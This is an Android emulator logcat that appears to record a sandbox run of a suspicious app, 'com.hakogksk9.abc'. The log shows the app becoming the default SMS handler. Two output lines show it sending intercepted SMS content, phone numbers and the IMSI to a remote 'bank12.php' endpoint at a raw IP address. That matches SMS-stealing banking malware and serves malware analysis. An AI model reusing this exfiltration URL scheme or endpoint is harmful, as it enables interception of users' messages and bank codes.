I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/Launcher(  675): Deferring update until onResume
I/Launcher(  675): Deferring update until onResume
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/Launcher(  675): Deferring update until onResume
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  601): GC_CONCURRENT freed 356K, 13% free 3407K/3876K, paused 5ms+110ms, total 217ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  355): GC_CONCURRENT freed 633K, 54% free 5861K/12520K, paused 106ms+35ms, total 626ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 176ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 46ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  601): GC_CONCURRENT freed 483K, 15% free 3381K/3964K, paused 39ms+2ms, total 78ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm( 1154): GC_FOR_ALLOC freed 43K, 5% free 2738K/2864K, paused 27ms, total 29ms
I/dalvikvm-heap( 1154): Grow heap (frag case) to 3.399MB for 682256-byte allocation
D/dalvikvm( 1154): GC_FOR_ALLOC freed <1K, 4% free 3404K/3532K, paused 31ms, total 31ms
D/dalvikvm( 1154): GC_CONCURRENT freed <1K, 4% free 3404K/3532K, paused 3ms+1ms, total 26ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  355): GC_CONCURRENT freed 818K, 54% free 5836K/12520K, paused 148ms+5ms, total 306ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 49ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 48ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/gralloc_goldfish( 1154): Emulator without GPU emulation detected.
I/ActivityManager(  355): Displayed com.hakogksk9.abc/.MainActivity: +2s545ms
D/AndroidRuntime( 1144): Shutting down VM
D/dalvikvm( 1144): GC_CONCURRENT freed 97K, 15% free 589K/692K, paused 2ms+1ms, total 21ms
I/ActivityManager(  355): Waited long enough for: ServiceRecord{b2fdff80 u0 com.android.calendar/.alerts.InitAlarmsService}
I/ActivityManager(  355): START u0 {cmp=com.hakogksk9.abc/.ListActivity} from pid 1154
I/System.out( 1154): CoreService is Beign
D/dalvikvm( 1154): GC_CONCURRENT freed 13K, 3% free 3862K/3956K, paused 5ms+7ms, total 111ms
V/AlarmClock(  982): AlarmInitReceiver android.intent.action.TIME_SET
I/Choreographer(  675): Skipped 84 frames!  The application may be doing too much work on its main thread.
I/AlarmClock(  982): Displaying next alarm time: ''
V/AlarmClock(  982): AlarmInitReceiver finished
I/ActivityManager(  355): Displayed com.hakogksk9.abc/.ListActivity: +2s70ms
D/InitAlarmsService(  954): Clearing and rescheduling alarms.
D/AndroidRuntime( 1171): 
D/AndroidRuntime( 1171): >>>>>> AndroidRuntime START com.android.internal.os.RuntimeInit <<<<<<
D/AndroidRuntime( 1171): CheckJNI is ON
D/dalvikvm( 1171): Trying to load lib libjavacore.so 0x0
D/dalvikvm( 1171): Added shared lib libjavacore.so 0x0
D/dalvikvm( 1171): Trying to load lib libnativehelper.so 0x0
D/dalvikvm( 1171): Added shared lib libnativehelper.so 0x0
D/dalvikvm( 1171): No JNI_OnLoad found in libnativehelper.so 0x0, skipping init
D/dalvikvm( 1171): Note: class Landroid/app/ActivityManagerNative; has 179 unimplemented (abstract) methods
E/memtrack( 1171): Couldn't load memtrack module (No such file or directory)
E/android.os.Debug( 1171): failed to load memtrack module: -2
D/AndroidRuntime( 1171): Calling main entry com.android.commands.am.Am
D/AndroidRuntime( 1171): Shutting down VM
D/dalvikvm( 1171): GC_CONCURRENT freed 97K, 15% free 587K/688K, paused 2ms+1ms, total 8ms
D/        (  355): Setting time of day to sec=1545729819
D/dalvikvm(  601): GC_CONCURRENT freed 460K, 17% free 3305K/3960K, paused 3ms+2ms, total 24ms
D/AndroidRuntime( 1182): 
D/AndroidRuntime( 1182): >>>>>> AndroidRuntime START com.android.internal.os.RuntimeInit <<<<<<
D/AndroidRuntime( 1182): CheckJNI is ON
D/dalvikvm( 1182): Trying to load lib libjavacore.so 0x0
D/dalvikvm( 1182): Added shared lib libjavacore.so 0x0
D/dalvikvm( 1182): Trying to load lib libnativehelper.so 0x0
D/dalvikvm( 1182): Added shared lib libnativehelper.so 0x0
D/dalvikvm( 1182): No JNI_OnLoad found in libnativehelper.so 0x0, skipping init
D/dalvikvm( 1182): Note: class Landroid/app/ActivityManagerNative; has 179 unimplemented (abstract) methods
E/memtrack( 1182): Couldn't load memtrack module (No such file or directory)
E/android.os.Debug( 1182): failed to load memtrack module: -2
D/AndroidRuntime( 1182): Calling main entry com.android.commands.am.Am
I/ActivityManager(  355): START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10000000 cmp=com.hakogksk9.abc/.ListActivity} from pid 1182
I/Choreographer( 1154): Skipped 42 frames!  The application may be doing too much work on its main thread.
I/ActivityManager(  355): Displayed com.hakogksk9.abc/.ListActivity: +947ms
D/AndroidRuntime( 1182): Shutting down VM
D/dalvikvm( 1182): GC_CONCURRENT freed 97K, 15% free 589K/692K, paused 1ms+2ms, total 16ms
I/MediaFocusControl(  355):  AudioFocus  abandonAudioFocus() from android.media.AudioManager@b2cad410com.android.music.MediaPlaybackService$3@b2cac290
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Scheme: "mmsto"
D/dalvikvm(  355): GC_CONCURRENT freed 776K, 54% free 5836K/12520K, paused 4ms+6ms, total 100ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 18ms
V/SmsReceiverService( 1029): onStart: #1 mResultCode: -1 = Activity.RESULT_OK
I/System.out( 1154): 
D/dalvikvm( 1154): GC_CONCURRENT freed 31K, 3% free 4255K/4368K, paused 3ms+4ms, total 31ms
I/System.out( 1154): http://98.126.92.204/bank12.php?m=Api&a=Sms&imsi=310260000000000&number=15555215554&fromnumber=7055554444&content=Hi+how+are+you
D/dalvikvm( 1029): GC_CONCURRENT freed 193K, 9% free 3096K/3368K, paused 4ms+4ms, total 31ms
E/StrictMode( 1029): A resource was acquired at attached stack trace but never released. See java.io.Closeable for information on avoiding resource leaks.
E/StrictMode( 1029): java.lang.Throwable: Explicit termination method 'release' not called
E/StrictMode( 1029): 	at dalvik.system.CloseGuard.open(CloseGuard.java:184)
E/StrictMode( 1029): 	at android.drm.DrmManagerClient.<init>(DrmManagerClient.java:258)
E/StrictMode( 1029): 	at com.google.android.mms.pdu.PduPersister.<init>(PduPersister.java:288)
E/StrictMode( 1029): 	at com.google.android.mms.pdu.PduPersister.getPduPersister(PduPersister.java:296)
E/StrictMode( 1029): 	at com.android.mms.transaction.TransactionService.onNewIntent(TransactionService.java:224)
E/StrictMode( 1029): 	at com.android.mms.transaction.TransactionService$ServiceHandler.handleMessage(TransactionService.java:621)
E/StrictMode( 1029): 	at android.os.Handler.dispatchMessage(Handler.java:102)
E/StrictMode( 1029): 	at android.os.Looper.loop(Looper.java:136)
E/StrictMode( 1029): 	at android.os.HandlerThread.run(HandlerThread.java:61)
D/MmsSmsProvider(  601): getSingleAddressId: insert new canonical_address for xxxxxx, _id=1
D/MmsSmsProvider(  601): getThreadId: create new thread_id for recipients xxxxxxxx
D/MmsSmsProvider(  601): insertThread: created new thread_id 1 for recipientIds xxxxxxx
D/dalvikvm(  601): GC_EXPLICIT freed 61K, 15% free 3306K/3876K, paused 3ms+4ms, total 35ms
D/SmsReceiverService( 1029): handleSmsReceived messageUri: content://sms/1 threadId: 1
D/dalvikvm( 1029): GC_CONCURRENT freed 250K, 10% free 3241K/3572K, paused 2ms+2ms, total 141ms
D/Mms:app ( 1029): updateNotification: new message, adding sound to the notification
D/AndroidRuntime( 1196): 
D/AndroidRuntime( 1196): >>>>>> AndroidRuntime START com.android.internal.os.RuntimeInit <<<<<<
D/AndroidRuntime( 1196): CheckJNI is ON
D/dalvikvm( 1196): Trying to load lib libjavacore.so 0x0
D/dalvikvm( 1196): Added shared lib libjavacore.so 0x0
D/dalvikvm( 1196): Trying to load lib libnativehelper.so 0x0
D/dalvikvm( 1196): Added shared lib libnativehelper.so 0x0
D/dalvikvm( 1196): No JNI_OnLoad found in libnativehelper.so 0x0, skipping init
D/dalvikvm( 1196): Note: class Landroid/app/ActivityManagerNative; has 179 unimplemented (abstract) methods
E/memtrack( 1196): Couldn't load memtrack module (No such file or directory)
E/android.os.Debug( 1196): failed to load memtrack module: -2
D/AndroidRuntime( 1196): Calling main entry com.android.commands.am.Am
I/ActivityManager(  355): START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10000000 cmp=com.hakogksk9.abc/.PostActivity} from pid 1196
D/dalvikvm( 1154): GC_FOR_ALLOC freed 824K, 20% free 3740K/4648K, paused 33ms, total 34ms
I/Choreographer( 1154): Skipped 184 frames!  The application may be doing too much work on its main thread.
D/dalvikvm( 1154): GC_CONCURRENT freed 16K, 12% free 4108K/4648K, paused 15ms+3ms, total 143ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
V/SmsReceiverService( 1029): onStart: #1 mResultCode: -1 = Activity.RESULT_OK
I/ActivityManager(  355): Displayed com.hakogksk9.abc/.PostActivity: +2s816ms
D/AndroidRuntime( 1196): Shutting down VM
D/dalvikvm( 1196): GC_CONCURRENT freed 97K, 15% free 589K/692K, paused 2ms+12ms, total 22ms
I/System.out( 1154): 
I/System.out( 1154): http://98.126.92.204/bank12.php?m=Api&a=Sms&imsi=310260000000000&number=15555215554&fromnumber=7018350&content=Wrong+number+dude%21
I/Choreographer( 1154): Skipped 173 frames!  The application may be doing too much work on its main thread.
D/dalvikvm(  589): GC_CONCURRENT freed 295K, 11% free 3189K/3560K, paused 4ms+9ms, total 59ms
I/Choreographer( 1154): Skipped 36 frames!  The application may be doing too much work on its main thread.
I/ResourceUtils(  589): Found default value: resource=phantom_sudden_move_event_device_list build=[HARDWARE=goldfish MODEL=sdk BRAND=generic MANUFACTURER=unknown] default=false
I/ResourceUtils(  589): Found default value: resource=keyboard_heights build=[HARDWARE=goldfish MODEL=sdk BRAND=generic MANUFACTURER=unknown] default=
W/SubtypeSwitcher(  589): Can't find Emoji subtype
W/SubtypeSwitcher(  589): No input method subtype found; return dummy subtype: android.view.inputmethod.InputMethodSubtype@d78b2ed0
I/ActivityManager(  355): START u0 {cmp=com.hakogksk9.abc/.EnActivity (has extras)} from pid 1154
D/dalvikvm(  589): GC_FOR_ALLOC freed 189K, 8% free 3357K/3624K, paused 99ms, total 100ms
W/InputMethodManagerService(  355): Window already focused, ignoring focus gain of: com.android.internal.view.IInputMethodClient$Stub$Proxy@b30534a0 attribute=null, token = android.os.BinderProxy@b2d13a18
D/dalvikvm(  589): GC_CONCURRENT freed 378K, 13% free 3425K/3932K, paused 5ms+66ms, total 217ms
D/dalvikvm(  589): GC_FOR_ALLOC freed 62K, 13% free 3443K/3932K, paused 228ms, total 229ms
I/dalvikvm-heap(  589): Grow heap (frag case) to 3.750MB for 331792-byte allocation
D/dalvikvm(  589): GC_FOR_ALLOC freed <1K, 12% free 3766K/4260K, paused 118ms, total 118ms
D/dalvikvm( 1154): GC_CONCURRENT freed 67K, 4% free 4466K/4648K, paused 30ms+116ms, total 295ms
D/dalvikvm(  589): GC_FOR_ALLOC freed 508K, 17% free 3553K/4260K, paused 193ms, total 195ms
I/dalvikvm-heap(  589): Grow heap (frag case) to 3.888MB for 364560-byte allocation
D/dalvikvm(  589): GC_FOR_ALLOC freed 48K, 17% free 3860K/4620K, paused 174ms, total 174ms
D/dalvikvm( 1154): GC_CONCURRENT freed 61K, 3% free 4877K/5020K, paused 5ms+5ms, total 201ms
D/dalvikvm(  589): GC_CONCURRENT freed 531K, 17% free 3840K/4620K, paused 4ms+44ms, total 310ms
D/dalvikvm(  589): WAIT_FOR_CONCURRENT_GC blocked 292ms
D/dalvikvm(  589): WAIT_FOR_CONCURRENT_GC blocked 272ms
D/dalvikvm(  589): GC_FOR_ALLOC freed 434K, 21% free 3650K/4620K, paused 78ms, total 79ms
I/ActivityManager(  355): Displayed com.hakogksk9.abc/.EnActivity: +3s600ms
D/dalvikvm(  589): GC_CONCURRENT freed 5K, 11% free 4153K/4620K, paused 33ms+8ms, total 444ms
I/Choreographer(  355): Skipped 30 frames!  The application may be doing too much work on its main thread.
I/Choreographer(  355): Skipped 43 frames!  The application may be doing too much work on its main thread.
I/Choreographer(  355): Skipped 37 frames!  The application may be doing too much work on its main thread.
I/ARMAssembler(   58): generated scanline__00000077:03010104_00008001_00000000 [ 89 ipp] (110 ins) at [0xb5b26680:0xb5b26838] in 10000000 ns
D/AndroidRuntime( 1211): 
